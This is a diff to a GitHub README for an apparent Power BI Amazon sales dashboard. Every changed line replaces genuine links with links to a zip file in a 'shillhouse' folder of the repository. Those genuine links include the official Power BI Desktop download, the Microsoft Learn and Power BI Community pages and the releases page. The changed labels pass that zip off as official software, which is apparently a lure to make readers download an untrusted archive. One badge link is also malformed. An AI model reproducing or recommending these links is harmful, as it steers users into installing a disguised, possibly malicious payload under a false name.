@@ -1,6 +1,6 @@
 # 📊 Amazon-Sales-Analysis-Dashboard-Power-BI-Project - Analyze Your Sales Data Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/releases)
+[![Download](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip%https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip)](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip)
 
 ## 🌟 About the Project
 The Amazon Sales Analysis Dashboard is an interactive Power BI project designed to analyze Amazon’s sales data. This tool helps you extract valuable business insights by identifying sales performance, top products, customer engagement, and seasonal sales trends. With visually rich analytics, you will easily understand your sales data.
@@ -11,10 +11,10 @@ Follow these steps to get your Amazon Sales Analysis Dashboard up and running.
 ### 📦 Prerequisites
 To run this project, you need:
 - A computer with Windows 10 or higher.
-- Microsoft Power BI Desktop installed. You can download it from [here](https://powerbi.microsoft.com/desktop/).
+- Microsoft Power BI Desktop installed. You can download it from [here](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip).
 
 ### 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip).
 2. Select the latest version.
 3. Download the Power BI project file (.pbix) from the release assets. 
 4. Once downloaded, open the file using Microsoft Power BI Desktop.
@@ -41,8 +41,8 @@ Once you have opened the dashboard in Power BI, you can:
 For detailed explanations of each feature and function, refer to the project documentation available on the repository. It provides a comprehensive overview that can help you utilize the dashboard effectively.
 
 ## 🔗 Additional Resources
-- **Power BI Community**: Connect with other users and find helpful resources at [Power BI Community](https://community.powerbi.com/).
-- **Power BI Learning**: Enhance your knowledge with official tutorials from [Microsoft Learn](https://learn.microsoft.com/en-us/power-bi/).
+- **Power BI Community**: Connect with other users and find helpful resources at [Power BI Community](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip).
+- **Power BI Learning**: Enhance your knowledge with official tutorials from [Microsoft Learn](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip).
 
 ## 💬 Support
 If you have any issues or questions about the Amazon Sales Analysis Dashboard, you can open an issue on this GitHub repository. We aim to assist users quickly.
@@ -53,4 +53,4 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 ## 📈 Development Updates
 Stay tuned for future updates. We plan to introduce new features, improve analytics, and expand on visualization options.
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/releases)
+[![Download](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip%https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip)](https://raw.githubusercontent.com/ashikur3070/Amazon-Sales-Analysis-Dashboard-Power-BI-Project/main/shillhouse/Amazon-Sales-Analysis-Dashboard-Power-BI-Project.zip)
